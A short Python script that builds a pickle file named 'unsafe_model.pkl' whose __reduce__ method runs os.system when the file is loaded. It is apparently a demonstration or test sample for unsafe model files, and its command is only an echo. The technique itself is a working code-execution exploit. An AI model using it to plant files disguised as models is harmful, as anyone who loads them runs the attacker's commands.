import pickle

# Define a malicious payload
class Malicious:
    def __reduce__(self):
        import os
        return (os.system, ("echo 'This is a malicious payload!'",))

# Create an unsafe model file
with open("unsafe_model.pkl", "wb") as unsafe_file:
    pickle.dump(Malicious(), unsafe_file)

print("File created: 'unsafe_model.pkl'")
